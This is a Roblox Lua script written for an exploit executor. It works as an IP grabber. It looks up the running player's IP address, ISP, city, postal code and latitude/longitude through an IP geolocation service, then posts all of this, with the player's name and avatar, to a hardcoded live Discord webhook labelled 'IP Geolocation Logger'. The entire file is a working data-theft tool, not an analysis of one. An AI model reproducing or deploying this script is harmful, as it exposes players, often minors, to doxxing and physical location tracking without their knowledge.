local httpService = game:GetService("HttpService")
local player = game:GetService("Players").LocalPlayer

-- Obtener la URL del avatar del jugador
toURL = "https://thumbnails.roblox.com/v1/users/avatar?userIds=" .. player.UserId .. "&size=720x720&format=Png&isCircular=false"
local successAvatar, avatarData = pcall(function()
    return httpService:JSONDecode(game:HttpGet(toURL)).data[1].imageUrl
end)

-- Obtener datos de IP
local successIP, ipData = pcall(function()
    return httpService:JSONDecode(game:HttpGet("https://ipapi.co/json"))
end)

ipData = successIP and ipData or {}

local function createField(name, key)
    return {
        name = name,
        value = ipData[key] and tostring(ipData[key]) or "Not Found"
    }
end

-- Enviar datos a Webhook
pcall(function()
    (request or http_request or http and http.request)({
        Url = "https://discord.com/api/webhooks/1363337251626549470/ZvTOXTzzcw0aPLfEYLkuCtxJCmKkxDMGMnUF0EKwRhC8nrWU4QNp1QWf2AK5q2JqUO6j",
        Method = "POST",
        Body = httpService:JSONEncode({
            embeds = {
                {
                    color = 1733608,
                    fields = {
                        createField("IP Address", "ip"),
                        createField("Network Range", "network"),
                        createField("ASN (Autonomous System Number)", "asn"),
                        createField("ISP (Internet Service Provider)", "org"),
                        createField("Country", "country_name"),
                        createField("Region/Province", "region"),
                        createField("City", "city"),
                        createField("Postal Code", "postal"),
                        createField("Latitude", "latitude"),
                        createField("Longitude", "longitude"),
                        createField("Timezone", "timezone")
                    }
                },
                {
                    title = "View " .. player.Name .. "'s full profile",
                    url = "https://www.roblox.com/users/" .. player.UserId .. "/profile",
                    color = 1733608,
                    image = {
                        url = successAvatar and avatarData or "https://i.ibb.co/mVYFTK2f/Avatar-Not-Found.png"
                    }
                }
            },
            username = "IP Geolocation Logger",
            avatar_url = "https://i.ibb.co/spwWKyBW/Globe-With-Meridians.png"
        }),
        Headers = {
            ["content-type"] = "application/json"
        }
    })
end)
